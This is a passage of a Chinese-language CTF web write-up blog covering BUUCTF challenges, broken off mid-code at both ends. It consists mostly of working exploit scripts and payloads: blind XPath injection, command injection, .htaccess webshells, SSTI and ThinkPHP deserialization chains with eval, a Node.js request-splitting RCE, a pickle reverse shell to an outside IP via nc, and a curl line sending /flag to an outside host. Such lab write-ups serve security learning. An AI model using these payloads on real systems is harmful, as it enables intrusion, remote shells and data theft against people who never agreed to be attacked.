'upload'\n}\nres1 = requests.post(url=url, data=data1, files=files)\n\n# 第四步:通过上面获取的session_id发起请求，获取flag\ncookie = {\n    'PHPSESSID': session_id\n}\nflag_res = requests.post(url, cookies=cookie)\nprint(flag_res.text)\n```\n\n## [NPUCTF2020]ezlogin\n\nXXE是你吗XXE\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206111752709.png)\n\n尝试了一遍发现不是，看wp是[XPath注入](https://www.tr0y.wang/2019/05/11/XPath注入指北/)，还有一个[盲注](https://xz.aliyun.com/t/7791)\n\nXPath中表示内容的方法（类似Linux中的文件结构）\n\n```\n/ 根节点\n/* 根结点下所有子节点\n//*所有节点\n/root/* 根结点root下的所有子节点\n```\n\n一些好用的XPath函数\n\n```\ncount 返回结果的数量\nstring-length 返回字符串长度\nname 返回节点名称\nsubstring 同MySQL中substr的用法\n\n```\n\n本题给个大佬脚本\n\n```python\nimport requests\nimport re\nimport time\n \nsession = requests.session()\nurl = \"http://391bfefa-8949-4535-8129-07c86723c6b9.node4.buuoj.cn\"\nchars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"\nhead = {\n    #'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',\n    'Content-Type': 'application/xml',\n    #\"Cookie\":\"UM_distinctid=1785326510411f-0b3fb285b5c49c-4c3f227c-144000-178532651052c9; session=b953d436-f0da-4e58-be79-22676707c609.K5TbTAnwLyhIU66duiTX1Usn1D8; PHPSESSID=dd258b30ebc3b42c352a92ed98092b1c\"\n        }\n \nfind = re.compile(r'<input type=\"hidden\" id=\"token\" value=\"(.*?)\" />',re.S)\nresult = \"\"\n#猜测根节点名称\npayload_1 = \"<username>'or substring(name(/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n#猜测子节点名称\npayload_2 = \"<username>'or substring(name(/root/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n#猜测accounts的节点\npayload_3 =\"<username>'or substring(name(/root/accounts/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n#猜测user节点\npayload_4 =\"<username>'or substring(name(/root/accounts/user/*[2]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n#跑用户名和密码\npayload_username =\"<username>'or substring(/root/accounts/user[2]/username/text(), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\npayload_password =\"<username>'or substring(/root/accounts/user[2]/password/text(), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n \ndef get_token():     #获取token的函数\n    resp = session.get(url=url)  #如果在这里用headers会得到超时的界面\n    token = find.findall(resp.text)[0]\n    #print(token)\n    return token\n \nfor x in range(1,100):\n    for char in chars:\n        time.sleep(0.3)\n        token = get_token()\n        playload = payload_username.format(x, char, token)   #根据上面的playload来改\n        #print(playload)\n        resp = session.post(url=url,headers=head, data=playload)\n        #print(resp.text)\n        if \"非法操作\" in resp.text:\n            result += char\n            print(result)\n            break\n    if \"用户名或密码错误\" in resp.text:\n        break\n```\n\n跑出结果为adm1n和md5解密后为gtfly123，登录成功，发现传参中含有文件参数，尝试php伪协议读取，被拦截，大小写绕过，读取/flag\n\n## EasyBypass\n\n源码\n\n```php\n<?php\n\nhighlight_file(__FILE__);\n\n$comm1 = $_GET['comm1'];\n$comm2 = $_GET['comm2'];\n\n\nif(preg_match(\"/\\'|\\`|\\\\|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|<|\\&[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is\", $comm1))\n    $comm1 = \"\";\nif(preg_match(\"/\\'|\\\"|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|<|\\&[^\\d]|@|\\||ls|\\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is\", $comm2))\n    $comm2 = \"\";\n\n$flag = \"#flag in /flag\";\n\n$comm1 = '\"' . $comm1 . '\"';\n$comm2 = '\"' . $comm2 . '\"';\n\n$cmd = \"file $comm1 $comm2\";\nsystem($cmd);\n?>\n```\n\n命令1，2过滤内容并不相同，命令1中过滤较少，直接从这边下手，首先双引号闭合，分号结束命令，tac读取文件，通配符匹配文件，最终payload如下\n\n```\n?comm1=\";tac /f*;\"\n```\n\n## [2020 新春红包题]1\n\n这题和**[EIS 2019]EzPOP**完全一致，唯一不同就是在文件名处多了过滤\n\n```php\n    public function getCacheKey(string $name): string {\n        // 使缓存文件名随机\n        $cache_filename = $this->options['prefix'] . uniqid() . $name;\n        if(substr($cache_filename, -strlen('.php')) === '.php') {\n          die('?');\n        }\n        return $cache_filename;\n    }\n```\n\n此处我们可以使用伪协议加目录穿越来绕过，传入`key = \"/../shell.php/.\";`且`options['prefix'] = 'php://filter/write=convert.base64-decode/resource=';`，此时内容变为：`php://filter/write=convert.base64-decode/resource=62a58e2e23e33/../shell.php`直接绕过\n\n## [羊城杯2020]easyphp\n\n文件上传.htaccess包含利用，首先在htaccess文件中是有注释符的，就它#，但是php不读这个的啊，那么我们就上传.htaccess文件并包含htaccess并且注释掉一句话木马即可，末尾记得加反斜杠来转译换行，file使用\\来绕过\n\n```\n php_value auto_prepend_fil\n \\e .htaccess\n #<?php system('tac /f*');?>\\\n```\n\n## [XNUCA2019Qualifier]EasyPHP\n\n这个非预期和上面那个一样，也是传入htaccess文件执行\n\n## [pasecactf_2019]flask_ssti\n\n过滤了'，.，_，使用16进制绕过，直接给payload了\n\n```\nnickname={{()[\"\\x5f\\x5fclass\\x5f\\x5f\"][\"\\x5f\\x5fbases\\x5f\\x5f\"][0][\"\\x5f\\x5fsubclasses\\x5f\\x5f\"]()[127][\"\\x5f\\x5finit\\x5f\\x5f\"][\"\\x5f\\x5fglobals\\x5f\\x5f\"][\"popen\"](\"tac app*\")[\"read\"]()}}\n```\n\n但是很明显看到源码也没啥用，因为flag已经被销毁了\n\n```python\nimport random\nfrom flask import Flask, render_template_string, render_template, request\nimport os\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'folow @osminogka.ann on instagram =)'\n\n#Tiaonmmn don't remember to remove this part on deploy so nobody will solve that hehe\n'''\ndef encode(line, key, key2):\n    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))\n\napp.config['flag'] = encode('', 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')\n'''\n\ndef encode(line, key, key2):\n    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))\n\nfile = open(\"/app/flag\", \"r\")\nflag = file.read()\nflag = flag[:42]\n\napp.config['flag'] = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')\nflag = \"\"\n\nos.remove(\"/app/flag\")\n```\n\n使用这个函数反向跑出flag即可\n\n## [安洵杯 2019]iamthinking\n\nwww.zip下载源码\n\n```php\n<?php\nnamespace app\\controller;\nuse app\\BaseController;\n\nclass Index extends BaseController\n{\n    public function index()\n    {\n        \n        echo \"<img src='../test.jpg'\".\"/>\";\n        $paylaod = @$_GET['payload'];\n        if(isset($paylaod))\n        {\n            $url = parse_url($_SERVER['REQUEST_URI']);\n            parse_str($url['query'],$query);\n            foreach($query as $value)\n            {\n                if(preg_match(\"/^O/i\",$value))\n                {\n                    die('STOP HACKING');\n                    exit();\n                }\n            }\n            unserialize($paylaod);\n        }\n    }\n}\n```\n\n可以看到这里有个反序列化，没有其他的方法了，只能看thinkPHP的反序列化漏洞了，至于其中的对第一个匹配的绕过，看[这里](https://www.cnblogs.com/tr1ple/p/11137159.html)，其中thinkPHP的反序列化链子可以用[这个](https://github.com/wh1t3p1g/phpggc)工具生成\n\n最终payload\n\n```\n//public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A196%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7Ds%3A8%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000001dae5f69000000005d7b61f7%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D\n```\n\n## [CISCN2019 总决赛 Day1 Web4]Laravel1\n\n从头开始找反序列化链子呗\n\n/source/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php中的`__destruct`方法为起始点，跟进`commit`方法，跟进`invalidateTags`方法\n\n```php\nif ($this->deferred) {\n    $items = $this->deferred;\n    foreach ($items as $key => $item) {\n        if (!$this->pool->saveDeferred($item)) {\n            unset($this->deferred[$key]);\n            $ok = false;\n        }\n    }\n\n    $f = $this->getTagsByKey;\n    $tagsByKey = $f($items);\n    $this->deferred = [];\n}\n```\n\n此处调用了pool的saveDeferred方法，pool可控，但是在`__construct`中限定了pool的类型需要是`AdapterInterface`，下一步就是找一个是`AdapterInterface`并且带有`saveDeferred`方法的类，看到这里/source/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php的`saveDeferred`，传入变量要求为`CacheItemInterface`类，全局搜索该类\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141634553.png)\n\n条件满足继续走方法\n\n```php\nprivate function initialize()\n{\n    if (!file_exists($this->file)) {\n        $this->keys = $this->values = [];\n\n        return;\n    }\n    $values = (include $this->file) ?: [[], []];\n\n    if (2 !== \\count($values) || !isset($values[0], $values[1])) {\n        $this->keys = $this->values = [];\n    } else {\n        list($this->keys, $this->values) = $values;\n    }\n}\n```\n\n此处include了文件，最终的文件读取，按照上述内容构造exp，注意命名空间\n\n```php\n<?php\nnamespace Symfony\\Component\\Cache{\n    final class CacheItem{\n    }\n}\n\nnamespace Symfony\\Component\\Cache\\Adapter{\n    use Symfony\\Component\\Cache\\CacheItem;\n    class PhpArrayAdapter{\n        private $file='/flag';\n    }\n    class TagAwareAdapter{\n        private $deferred;\n        private $pool;\n        public function __construct(){\n            $this->deferred = array('xxx' => new CacheItem());\n            $this->pool = new PhpArrayAdapter();\n        }\n    }\n$a=new TagAwareAdapter();\necho urlencode(serialize($a));\n}\n?>\n```\n\n## virink_2019_files_share\n\n看源码，uploads文件夹，随便点一个文件看参数，任意文件读取，此处要绕一下../，变成...//\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141718491.png)\n\n## [NESTCTF 2019]Love Math 2\n\n和Love Math一样，构造_GET来自己塞东西进去\n\n```php\n<?php\n$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\nfor($k=1;$k<=sizeof($payload);$k++){\n    for($i = 0;$i < 9; $i++){\n        for($j = 0;$j <=9;$j++){\n            $exp = $payload[$k] ^ $i.$j;\n            echo($payload[$k].\"^$i$j\".\"==>$exp\");\n            echo \"<br />\";\n        }\n    }\n}\n```\n\n最终payload\n\n```\n?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat%20/flag\n```\n\n## [PASECA2019]honey_shop\n\n提示图片点击可以下载，任意文件读取\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151413306.png)\n\n读取到环境变量中的`SECRET_KEY=Ya300IkfSE7qZtNFuMzRj1bJXD8nob8ArGUejqgR`，源码读不到但是知道是python环境，flask-session伪造\n\n```\npython3 flask_session_cookie_manager3.py encode -s \"私钥\"  -t \"内容\" \npython3 flask_session_cookie_manager3.py encode -s \"Ya300IkfSE7qZtNFuMzRj1bJXD8nob8ArGUejqgR\"  -t \"{'balance':114514}\" \n```\n\n## [GYCTF2020]Node Game\n\n源码喵喵\n\n```javascript\nvar express = require('express');\nvar app = express();\nvar fs = require('fs');\nvar path = require('path');\nvar http = require('http');\nvar pug = require('pug');\nvar morgan = require('morgan');\nconst multer = require('multer');\napp.use(multer({dest: './dist'}).array('file'));\napp.use(morgan('short'));\napp.use(\"/uploads\",express.static(path.join(__dirname, '/uploads')))\napp.use(\"/template\",express.static(path.join(__dirname, '/template')))\napp.get('/', function(req, res) {\n    var action = req.query.action?req.query.action:\"index\";\n    if( action.includes(\"/\") || action.includes(\"\\\\\") ){//action参数过滤斜杠杠\n        res.send(\"Errrrr, You have been Blocked\");\n    }\n    file = path.join(__dirname + '/template/'+ action +'.pug');\n    var html = pug.renderFile(file);//用pug引擎渲染\n    res.send(html);\n});\napp.post('/file_upload', function(req, res){\n    var ip = req.connection.remoteAddress;//不能用X-Forwarded-For伪造\n    var obj = {\n        msg: '',\n    }\n    if (!ip.includes('127.0.0.1')) {\n        obj.msg=\"only admin's ip can use it\"\n        res.send(JSON.stringify(obj));\n        return \n    }\n    fs.readFile(req.files[0].path, function(err, data){\n        if(err){\n            obj.msg = 'upload failed';\n            res.send(JSON.stringify(obj));\n        }else{\n            var file_path = '/uploads/' + req.files[0].mimetype +\"/\";\n          \t//任意文件上传并且通过MIME类型来保存文件位置，MIME可控所以可以进行目录穿越\n            var file_name = req.files[0].originalname\n            var dir_file = __dirname + file_path + file_name\n            if(!fs.existsSync(__dirname + file_path)){\n                try {\n                    fs.mkdirSync(__dirname + file_path)\n                } catch (error) {\n                    obj.msg = \"file type error\";\n                    res.send(JSON.stringify(obj));\n                    return\n                }\n            }\n            try {\n                fs.writeFileSync(dir_file,data)\n                obj = {\n                    msg: 'upload success',\n                    filename: file_path + file_name\n                } \n            } catch (error) {\n                obj.msg = 'upload failed';\n            }\n            res.send(JSON.stringify(obj));    \n        }\n    })\n})\napp.get('/source', function(req, res) {\n    res.sendFile(path.join(__dirname + '/template/source.txt'));\n});\napp.get('/core', function(req, res) {\n    var q = req.query.q;\n    var resp = \"\";\n    if (q) {\n        var url = 'http://localhost:8081/source?' + q//对参数q进行处理并进行本地访问，纯纯SSRF\n        console.log(url)\n        var trigger = blacklist(url);\n        if (trigger === true) {\n            res.send(\"<p>error occurs!</p>\");\n        } else {\n            try {\n                http.get(url, function(resp) {\n                    resp.setEncoding('utf8');\n                    resp.on('error', function(err) {\n                    if (err.code === \"ECONNRESET\") {\n                     console.log(\"Timeout occurs\");\n                     return;\n                    }\n                   });\n\n                    resp.on('data', function(chunk) {\n                        try {\n                         resps = chunk.toString();\n                         res.send(resps);\n                        }catch (e) {\n                           res.send(e.message);\n                        }\n \n                    }).on('error', (e) => {\n                         res.send(e.message);});\n                });\n            } catch (error) {\n                console.log(error);\n            }\n        }\n    } else {\n        res.send(\"search param 'q' missing!\");\n    }\n})\nfunction blacklist(url) {\n    var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"];\n    var arrayLen = evilwords.length;\n    for (var i = 0; i < arrayLen; i++) {\n        const trigger = url.includes(evilwords[i]);\n        if (trigger === true) {\n            return true\n        }\n    }\n}\nvar server = app.listen(8081, function() {\n    var host = server.address().address\n    var port = server.address().port\n    console.log(\"Example app listening at http://%s:%s\", host, port)\n})\n\n```\n\n能分析的都写到代码注释里面了，下面要利用的一个node.js早期的拆分攻击漏洞，先贴一个大佬[wp](https://blog.csdn.net/cjdgg/article/details/119068329)\n\n拆分攻击，是指在HTTP请求头中伪造出\\r\\n转义字符，来使得HTTP服务器将一个请求当作两个或多个请求执行，当然，大部分服务器都考虑到了这种情况，会将传来的内容进行转译，node.js也不例外，但是在node.js 8版本及以前，node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符，导致字符会被截断，使得我们需要的\\r\\n出现，具体可见下面的内容\n\n> # HTTP请求路径中的unicode字符损坏\n>\n> 一切都开始于我调试的一个非关联的unicode处理issue，并最终将我引向一个错误报告：[bug report against the Node.js `http` module](https://github.com/nodejs/node/issues/13296),报告中提到：\n>\n> [![img](https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png)\n>\n> 换句话说，报告者使用Node.js向特定路径发出HTTP请求，但是发出的请求实际上被定向到了不一样的路径！深入研究一下，发现这个问题是由Node.js将HTTP请求写入路径时对unicode字符的有损编码引起的。\n>\n> 虽然用户发出的`http`请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符，例如🐶\n>\n> 相反，这些字符被截断为其JavaScript表示的最低字节：\n> [![img](https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png)\n>\n> 处理用户输入时的坏数据通常是底层安全问题的危险信号，我知道我们的代码库发出了可能包含用户输入的路径的HTTP请求。所以我立即在Bugzilla中提交了一个保密的安全漏洞，向node安全团队寻求更多信息，然后根据用户提供的unicode字符串寻找我们可能构建URL的地方。\n>\n> 内容源自：https://xz.aliyun.com/t/2894\n\n偷一个大佬的脚本\n\n```python\nimport requests\n\npayload = \"\"\" HTTP/1.1\nHost: 127.0.0.1\nConnection: keep-alive\n\nPOST /file_upload HTTP/1.1\nHost: 127.0.0.1\nContent-Length: {}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt\n\n{}\"\"\".replace('\\n', '\\r\\n')\n\nbody = \"\"\"------WebKitFormBoundarysAs7bV3fMHq0JXUt\nContent-Disposition: form-data; name=\"file\"; filename=\"lmonstergg.pug\"\nContent-Type: ../template\n\n-var x = eval(\"glob\"+\"al.proce\"+\"ss.mainMo\"+\"dule.re\"+\"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()\")\n-return x\n------WebKitFormBoundarysAs7bV3fMHq0JXUt--\n\n\"\"\".replace('\\n', '\\r\\n')\n\npayload = payload.format(len(body), body) \\\n    .replace('+', '\\u012b')             \\\n    .replace(' ', '\\u0120')             \\\n    .replace('\\r\\n', '\\u010d\\u010a')    \\\n    .replace('\"', '\\u0122')             \\\n    .replace(\"'\", '\\u0a27')             \\\n    .replace('[', '\\u015b')             \\\n    .replace(']', '\\u015d') \\\n    + 'GET' + '\\u0120' + '/'\n\nsession = requests.Session()\nsession.trust_env = False\nresponse1 = session.get('http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/core?q=' + payload)\nresponse = session.get('http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/?action=lmonstergg')\nprint(response.text)\n```\n\n## [watevrCTF-2019]Pickle Store\n\n明示pickle，先解码看看\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151820591.png)\n\n很明显有加密验证啊，那就不能伪造内容了，只能自己搞个类反弹shell了\n\n```python\nimport base64\nimport pickle\n\nclass A(object):\n    def __reduce__(self):\n        return (eval, (\"__import__('os').system('nc 43.249.193.167 38901 -e/bin/sh')\",))\na = A()\nprint(base64.b64encode(pickle.dumps(a)))\n```\n\n## [CISCN2019 华东北赛区]Web2\n\nXSSSSSSSSSSSSSS，不出网，还是之后XSS平台能用了再说吧\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [RootersCTF2019]ImgXweb\n\n注册登录看到jwt，扫目录扫出来密钥，直接伪造admin就行\n\n## [GWCTF 2019]你的名字\n\n除了SSTI还能是啥\n\n测试呗，输入个两对花括号发现被滤了，~~还爆出了是php环境，其实并不是，估计是BUU复现环境的问题~~\n\n没关系还有命令执行可用，啥符号都没过滤直接拼接就行\n\n## [BSidesCF 2020]Hurdles\n\n谢谢这道题，让我狠狠了解了一把curl怎么用\n\n```bash\ncurl -i -X PUT 'http://node4.buuoj.cn:26923/hurdles/!?get=flag&%26%3D%26%3D%26=%2500%0a' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H \"X-Forwarded-For:13.37.13.37,127.0.0.1\" -b \"Fortune=6265\" -H \"Accept:text/plain\" -H \"Accept-Language:ru\" -H \"origin:https://ctf.bsidessf.net\" -H \"referer:https://ctf.bsidessf.net/challenges\"\n```\n\ncurl使用方法\n\n```bash\ncurl -o 文件名 链接 #下载URL内容并重命名为文件名\n-O 链接 #以URL结尾做文件名\n-L #跟随重定向跳转\n-C - -O 链接 #继续被中断的下载\n--trace-ascii 文件 链接 #将整个curl命令执行过程写入文件\n-X 请求方式 #使用指定的请求方式来发起请求\n-F \"name=@文件本地路径\" #上传文件\n--data #带POST参数，可带json\n--cookie #携带cookie\n--cookie stored_cookies_file_path #读取cookie\n--user-agent 或者 -A #带UA头\n-H #带请求头\n--user username:password #通过Basic Authentication验证\n-i #显示完整响应\n```\n\n## [HarekazeCTF2019]Easy Notes\n\n代码审计和SESSION文件伪造\n\n看拿flag的要求是`$SESSION['admin']==true`，在文件下载代码处可看到，生成文章打包后文件和SESSION文件存储在同一文件夹下，可以进行伪造，看文件名处理的代码\n\n```php\n$filename = get_user() . '-' . bin2hex(random_bytes(8)) . '.' . $type;\n$filename = str_replace('..', '', $filename); // avoid path traversal\n$path = TEMP_DIR . '/' . $filename;\n```\n\n此处将文件名命名为`用户名-随机8位16进制数.type参数`，并且如果有两个.还会将其替换为空，那么我们构造用户名为`sess_`，type为`.`最终生成的文件就是`sess_-随机8位16进制数`，刚好符合SESSION文件存储命名，而又因为下面生成文件使用的是zip方式打包，文本原样写入，我们只需要在文章标题处构造`admin|b:1;`就能被默认反序列化方式获取，而为了防止前后字符影响，构造标题为`xxxx|N;admin|b:1;xxxxxx`，通过下载获取SESSID，修改cookie即可\n\n## [BSidesCF 2019]Pick Tac Toe\n\n看页面代码，按照对应字符传参可覆盖电脑步数\n\n## [RCTF 2019]Nextphp\n\n禁用了一堆函数，并且带有openbase_dir，通过glob协议扫出flag在根目录，然后当前目录还有一个php文件，代码如下\n\n```php\n<?php\nfinal class A implements Serializable {\n    protected $data = [\n        'ret' => null,\n        'func' => 'print_r',\n        'arg' => '1'\n    ];\n\n    private function run () {\n        $this->data['ret'] = $this->data['func']($this->data['arg']);\n    }\n\n    public function __serialize(): array {\n        return $this->data;\n    }\n\n    public function __unserialize(array $data) {\n        array_merge($this->data, $data);\n        $this->run();\n    }\n\n    public function serialize (): string {\n        return serialize($this->data);\n    }\n\n    public function unserialize($payload) {\n        $this->data = unserialize($payload);\n        $this->run();\n    }\n\n    public function __get ($key) {\n        return $this->data[$key];\n    }\n\n    public function __set ($key, $value) {\n        throw new \\Exception('No implemented');\n    }\n\n    public function __construct () {\n        throw new \\Exception('No implemented');\n    }\n}\n```\n\n此处利用的是php7.4新引进的一项特性：[FFI扩展详解](https://www.laruence.com/2020/03/11/5475.html)\n\n总体的FFI调用逻辑就是\n\n```php\n<?php\n\t\t$a=FFI::cdef(C中的函数A(C中定义函数A的参数);C中的函数B(C中定义函数B的参数);,\"需要加在的动态库\");\n\t\t$a->A(A参数);\n?>\n```\n\n那么在上面的这个序列化内容中我们就可以做如下构造\n\n```php\n<?php\nfinal class A implements Serializable {\n    protected $data = [\n        'ret' => null,\n        'func' => 'FFI::cdef',\n        'arg' => 'int system(char *command);'\n    ];\n    public function serialize (): string {\n        //此处两个函数需要保留是因为Serializable是一个接口，其中的属性不再次经过声明是不能进行序列化和反序列化的\n        return serialize($this->data);\n    }\n    public function unserialize($payload) {\n    }\n}\n$a = new A();\necho serialize($a);\n?>\n```\n\n由于在反序列化时会执行run函数，将FFI调用后的结果传给$data->ret变量，进而对ret调用即可调用C中的system函数，绕过php的限制，不能直接访问data因为其为保护属性\n\n```\npayload:?a=$a=unserialize('C:1:\"A\":89:{a:3:{s:3:\"ret\";N;s:4:\"func\";s:9:\"FFI::cdef\";s:3:\"arg\";s:26:\"int system(char *command);\";}}');\n$a-> __serialize()['ret']->system('curl -d @/flag 182.61.46.138:12345');\n```\n\n## [watevrCTF-2019]Supercalc\n\n合理怀疑SSTI，但是双花括号被过滤了，试试让程序报错，使用1/0，得到报错\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162052551.png)\n\n那在后面贴上注释，看看里面会不会被执行，传入了没执行\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162053572.png)\n\n那再传入模版语法试试，成功爆出`SECRET_KEY`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162055573.png)\n\n尝试直接传入提示长度过长，那就伪造session吧\n\n```bash\npython3 *3.py encode -s \"cded826a1e89925035cc05f0907855f7\" -t '{\"history\":[{\"code\":\"__import__(\\\"os\\\").popen(\\\"cat flag.txt\\\").read()\"}]}'\n```\n\n## [SWPU2019]Web3\n\n伪造session，访问个404的网站，可以拿到`SECRET_KEY:keyqqqwwweee!@#$%^&*`\n\nID处base64解码发现是100，伪造成1试试\n\n```\npython3 *3.py encode -s 'keyqqqwwweee!@#$%^&*' -t '{\"id\":{\"b\":\"1\"},\"is_login\":True,\"password\":\"admin\",\"username\":\"admin\"}' \n```\n\n进去了，有源码\n\n```python\n@app.route('/upload',methods=['GET','POST'])\ndef upload():\n    if session['id'] != b'1':\n        return render_template_string(temp)\n    if request.method=='POST':\n        m = hashlib.md5()\n        name = session['password']\n        name = name+'qweqweqwe'\n        name = name.encode(encoding='utf-8')\n        m.update(name)\n        md5_one= m.hexdigest()\n        n = hashlib.md5()\n        ip = request.remote_addr\n        ip = ip.encode(encoding='utf-8')\n        n.update(ip)\n        md5_ip = n.hexdigest()\n        f=request.files['file']\n        basepath=os.path.dirname(os.path.realpath(__file__))\n        path = basepath+'/upload/'+md5_ip+'/'+md5_one+'/'+session['username']+\"/\"\n        path_base = basepath+'/upload/'+md5_ip+'/'\n        filename = f.filename\n        pathname = path+filename\n        if \"zip\" != filename.split('.')[-1]:\n            return 'zip only allowed'\n        if not os.path.exists(path_base):\n            try:\n                os.makedirs(path_base)\n            except Exception as e:\n                return 'error'\n        if not os.path.exists(path):\n            try:\n                os.makedirs(path)\n            except Exception as e:\n                return 'error'\n        if not os.path.exists(pathname):\n            try:\n                f.save(pathname)\n            except Exception as e:\n                return 'error'\n        try:\n            cmd = \"unzip -n -d \"+path+\" \"+ pathname\n            if cmd.find('|') != -1 or cmd.find(';') != -1:\n\t\t\t\twaf()\n                return 'error'\n            os.system(cmd)\n        except Exception as e:\n            return 'error'\n        unzip_file = zipfile.ZipFile(pathname,'r')\n        unzip_filename = unzip_file.namelist()[0]\n        if session['is_login'] != True:\n            return 'not login'\n        try:\n            if unzip_filename.find('/') != -1:\n                shutil.rmtree(path_base)\n                os.mkdir(path_base)\n                return 'error'\n            image = open(path+unzip_filename, \"rb\").read()\n            resp = make_response(image)\n            